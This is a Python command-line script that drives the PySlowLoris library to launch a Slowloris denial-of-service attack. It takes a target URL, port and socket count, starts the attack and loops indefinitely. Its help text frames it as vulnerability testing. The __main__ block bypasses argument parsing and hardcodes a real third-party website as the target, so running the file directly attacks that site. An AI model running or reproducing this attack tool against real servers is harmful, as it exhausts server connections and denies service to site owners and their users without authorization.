#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import argparse
import datetime
import re
import sys
import threading
import time
from signal import signal, SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM

from PySlowLoris import TargetInfo, SlowLorisAttack

__all__ = ["main"]

slowloris = None


class ExitException(Exception):
    pass


def cleanup(*args):
    sys.stdout.write("\r")
    sys.stdout.flush()
    try:
        global slowloris
        slowloris.stop_attack()
        del slowloris
        raise ExitException()
    except ExitException:
        sys.exit(0)


def init():
    # exit handlers
    for sig in (SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM):
        signal(sig, cleanup)


def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        # domain...
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return regex.match(url)


def parse_args():
    parser = argparse.ArgumentParser(
        add_help=True, description="Small and simple tool for testing Slow Loris vulnerability\n\n@maxkrivich")
    parser.add_argument("-u", "--url", action="store", type=str,
                        help="Link to the web server (http://google.com) - str")
    parser.add_argument("-s", "--socket-count", default=300, action="store", type=int,
                        help="Maximum count of created connection (default value 300) - int")
    parser.add_argument("-p", "--port", default=80, action="store",
                        type=int, help="Port what will be used - int")
    # parser.add_argument("-l", "--list", action="store", type=str, help="") # TODO write list of sites

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(-1)

    res = {}

    args = parser.parse_args()

    if args.url:
        if validate_url(args.url):
            res["url"] = args.url
        else:
            parser.print_help()
            sys.exit(-1)
    else:
        parser.print_help()
        sys.exit(-1)

    if 0 < args.socket_count <= 1000:
        res["sockets"] = args.socket_count
    else:
        parser.print_help()
        sys.exit(-1)

    if 0 <= args.port <= 65535:
        res["port"] = args.port
    else:
        parser.print_help()
        sys.exit(-1)

    return res


def print_table(table):
    col_width = [max(len(x) for x in col) for col in zip(*table)]
    for line in table:
        print("[*] " + " \t ".join("{:{}}".format(x, col_width[i]) for i, x in enumerate(line)))


def print_info(target):
    target.get_info()

    table = [('Target IP:', target['ip']), ('Target Hostname:', target['url']), ('Target Server:', target['server']),
             ('Target Port', str(target['port'])), ('Launch Time:', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"))]

    print_table(table)


def print_status():
    sys.stdout.write("\r")
    sys.stdout.write(str(slowloris.get_counters()))
    sys.stdout.flush()


def main():
    # TODO check site exists
    init()
    args = parse_args()
    target = TargetInfo(url=args['url'], port=args['port'])
    print_info(target)
    global slowloris
    slowloris = SlowLorisAttack(target, sockets=args['sockets'])
    slowloris.start_attack()
    # timer = threading.Timer(1.5, print_status)
    # timer.start()

    while True:
        print_status()
        time.sleep(0.5)


if __name__ == "__main__":
    target = TargetInfo(url="http://insart.com/", port=80)
    target.get_info()
    global slowloris
    slowloris = SlowLorisAttack(target)
    slowloris.start_attack()
    timer = threading.Timer(0.8, print_status)

    while True:
        time.sleep(0.5)
